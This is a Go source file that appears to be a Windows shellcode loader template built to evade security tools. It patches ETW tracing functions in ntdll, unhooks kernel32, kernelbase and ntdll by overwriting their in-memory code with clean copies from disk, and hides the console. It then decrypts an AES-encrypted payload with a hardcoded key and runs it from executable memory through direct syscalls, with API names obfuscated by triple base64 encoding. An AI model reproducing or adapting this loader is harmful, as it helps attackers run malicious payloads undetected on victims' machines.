package main

import "C"

import (
	"cmds/cmds"
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/base64"
	"encoding/hex"
	"time"

	"io/ioutil"
	"strconv"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
)
var _ unsafe.Pointer
const (
	errnoERROR_IO_PENDING = 997
)
var (
	errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
	customsyscall uint16
	B64number int = 3
)


func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpadding  := int(src[length-1])
	return src[:(length - unpadding )]
}


func Hide(show bool) {
	//GetConsoleWindowName
	getWin := syscall.NewLazyDLL("kernel32.dll").NewProc(cusBase64decode("VWpKV01GRXlPWFZqTWpseldsWmtjR0p0VW5aa2R6MDk="))
	//ShowWindowName
	showWin := syscall.NewLazyDLL("user32.dll").NewProc(cusBase64decode("VlRKb2RtUXhaSEJpYlZKMlpIYzlQUT09"))
	hwnd, _, _ := getWin.Call()
	if hwnd == 0 {
			return
	}
	if show {
	   var SW_RESTORE uintptr = 9
		showWin.Call(hwnd, SW_RESTORE)
	} else {
	   var SW_HIDE uintptr = 0
		showWin.Call(hwnd, SW_HIDE)
	}
}

func Versionfunc() string {
	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	CurrentVersion, _, _ :=  regkey.GetStringValue("CurrentVersion")
	MajorVersion, _, err := regkey.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		MinorVersion, _, _ := regkey.GetIntegerValue("CurrentMinorVersionNumber")
		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
	}
	defer regkey.Close()

	if CurrentVersion == "10.0" {
		customsyscall = 0x50
	} else if CurrentVersion == "6.3" {
		customsyscall = 0x4f
	} else if CurrentVersion == "6.2" {
		customsyscall = 0x4e
	} else if CurrentVersion == "6.1" {
		customsyscall= 0x4d
	}
	return CurrentVersion

}

//WriteProcessMemoryName
var procWriteProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc(cusBase64decode("VmpOS2NHUkhWbEZqYlRscVdsaE9lbFJYVm5SaU0wbzE="))
//EtwNotificationRegisterName
var procEtwNotificationRegister = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xUnRPVEJoVjFwd1dUSkdNR0ZYT1hWVmJWWnVZVmhPTUZwWVNUMD0="))
//EtwEventRegisterName
var procEtwEventRegister = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKVFdsZGtjR016VW14alp6MDk="))
//EtwEventWriteFullName
var procEtwEventWriteFull = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKWVkyMXNNRnBWV2pGaVIzYzk="))
//EtwEventWriteName
var procEtwEventWrite = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKWVkyMXNNRnBSUFQwPQ=="))


func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}

	return e
}


func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func patchETW() {
	handle := uintptr(0xffffffffffffffff)
	dataAddr := []uintptr{ procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWrite.Addr()}
	for i, _ := range dataAddr {
		data, _ := hex.DecodeString("4833C0C3")
		var nLength uintptr
		datalength := len(data)
		WriteProcessMemory(handle, dataAddr[i], &data[0], uintptr(uint32(datalength)), &nLength)
	}
}


func FullUnhook()  {
	//C:\\windows\\system32\\kernel32.dll
	err := Reloading(cusBase64decode("VVhwd1kxWXliSFZhUnprell6RjRWR1ZZVGpCYVZ6QjZUV3g0Y2xwWVNuVmFWM2Q2VFdrMWEySkhkejA9"))
	if err != nil {

	}
	//C:\\windows\\system32\\kernelbase.dll
	err = Reloading(cusBase64decode("VVhwd1kxWXliSFZhUnprell6RjRWR1ZZVGpCYVZ6QjZUV3g0Y2xwWVNuVmFWM2hwV1ZoT2JFeHRVbk5pUVQwOQ=="))
	if err != nil {

	}
	//C:\\windows\\system32\\ntdll.dll
	err = Reloading(cusBase64decode("VVhwd1kxWXliSFZhUnprell6RjRWR1ZZVGpCYVZ6QjZUV3g0ZFdSSFVuTmlRelZyWWtkM1BRPT0="))
	if err != nil {

	}
}

func cusBase64decode(b64 string,) string {
	var decoded []byte
	decoded, _ = base64.StdEncoding.DecodeString(b64)
	sum := 1
	for i := 1; i < B64number; i++ {
		decoded, _ = base64.StdEncoding.DecodeString(string(decoded))
		sum += i
	}
	return string(decoded)
}

func main() {
	patchETW()
	time.Sleep(2340 * time.Millisecond)
	Version := Versionfunc()
	if Version == "10.0" {
		FullUnhook()
	}
	patchETW()
	Hide(false)

	ptr := func() {
	}
	var ciphertext string
	ciphertext = ciphertext + "Base64String1"
	ciphertext = ciphertext + "Base64String2"
	ciphertext = ciphertext + "Base64String3"
	ciphertext = ciphertext + "Base64String4"
	ciphertext = ciphertext + "Base64String5"
	ciphertext = ciphertext + "Base64String6"
	ciphertext = ciphertext + "Base64String7"
	ciphertext = ciphertext + "Base64String8"


	vciphertext, _ := base64.StdEncoding.DecodeString(ciphertext)
	vkey, _ := base64.StdEncoding.DecodeString("4NX+ER907Ccgj91s9XOAPARPc0JhEN7PJvQ7qZsFFe8=")
	viv, _ := base64.StdEncoding.DecodeString("7Xurcw2cao7ZdBctV3uXbA==")

	block, err := aes.NewCipher(vkey)
	if err != nil {
		return
	}

	if len(vciphertext) < aes.BlockSize {
		return
	}

	decrypted := make([]byte, len(vciphertext))
	mode := cipher.NewCBCDecrypter(block, viv)
	mode.CryptBlocks(decrypted, vciphertext)
	stuff := PKCS5UnPadding(decrypted)

	rawdata := (string(stuff))
	hexdata, _ := base64.StdEncoding.DecodeString(rawdata)
	raw_bin, _ := hex.DecodeString(string(hexdata))


	var old uintptr
	handle := uintptr(0xffffffffffffffff)
	regionsize := uintptr(len(raw_bin))

	runfunc, _ := NtProtectVirtualMemory(
		customsyscall,
		handle,
		(*uintptr)(unsafe.Pointer(&ptr)),
		&regionsize,
		syscall.PAGE_EXECUTE_READWRITE,
		&old,
	)
	if runfunc != 0 {
	}

	*(**uintptr)(unsafe.Pointer(&ptr)) = (*uintptr)(unsafe.Pointer(&raw_bin))

	var oldfartcodeperms uintptr



	runfunc, _ = NtProtectVirtualMemory(
		customsyscall,
		handle,
		(*uintptr)(unsafe.Pointer(&raw_bin)),
		&regionsize,
		syscall.PAGE_EXECUTE_READWRITE,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}

	syscall.Syscall(**(**uintptr)(unsafe.Pointer(&ptr)),0, 0, 0, 0,)

}

func Reloading(DLLname string) error {

	dll, err := ioutil.ReadFile(DLLname)
	if err != nil {
		return err
	}
	file, error1 := pe.Open(DLLname)
	if error1 != nil {
		return error1
	}
	x := file.Section(".text")
	bytes := dll[x.Offset:x.Size]
	loaddll, error2 := windows.LoadDLL(DLLname)
	if error2 != nil {
		return error2
	}
	handle := loaddll.Handle
	dllBase := uintptr(handle)
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
	var oldfartcodeperms uintptr
	regionsize := uintptr(len(bytes))
	handlez := uintptr(0xffffffffffffffff)
	runfunc, _ := NtProtectVirtualMemory(
		customsyscall,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&regionsize,
		syscall.PAGE_EXECUTE_READWRITE,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}


	for i := 0; i < len(bytes); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = bytes[i]
	}

	runfunc, _ = NtProtectVirtualMemory(
		customsyscall,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&regionsize,
		oldfartcodeperms,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}

	return nil
}
func NtProtectVirtualMemory(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {

	return cmds.NtProtectVirtualMemory(
		sysid,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		NewProtect,
		uintptr(unsafe.Pointer(oldprotect)),
	)
}

